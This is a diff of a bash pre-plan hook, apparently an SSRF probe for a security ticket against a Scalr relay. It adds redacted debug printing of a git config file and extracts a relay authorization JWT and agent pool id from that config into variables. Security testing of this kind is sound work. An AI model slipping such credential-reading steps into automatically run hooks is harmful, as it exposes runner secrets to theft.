@@ -1,11 +1,16 @@
 #!/usr/bin/env bash
 # SCALRCORE-38322 SSRF gap probe — pre-plan hook.
 
-JWT=$(grep -oP '(?<=x-relay-authorization:).+' "$XDG_CONFIG_HOME/git/config")
-POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:).+' "$XDG_CONFIG_HOME/git/config")
+echo "DEBUG: git config keys (values redacted)"
+awk -F= '/^[[:space:]]*extraHeader=/ {
+  split($2, a, ":"); print "extraHeader_key=" a[1] " value_len=" (length($2)-length(a[1])-1)
+}' "$XDG_CONFIG_HOME/git/config"
+echo "DEBUG: full file structure (auth/token values redacted)"
+sed -E 's#(extraHeader=[^:]+:).+#\1<redacted>#; s#://([^:/@]+):[^@]+@#://\1:<redacted>@#' "$XDG_CONFIG_HOME/git/config"
+
+JWT=$(grep -oP '(?<=x-relay-authorization:)[[:space:]]*\K\S+' "$XDG_CONFIG_HOME/git/config")
+POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:)[[:space:]]*\K\S+' "$XDG_CONFIG_HOME/git/config")
 RELAY=https://relay.main.scalr.dev
-echo "DEBUG: git config follows (auth redacted)"
-sed 's/\(x-relay-authorization:\)[^[:space:]]*/\1<redacted>/' "$XDG_CONFIG_HOME/git/config" 2>/dev/null | sed 's/:[^/@:]\{20,\}@/:<token>@/'
 
 run() {
   local label=$1; shift
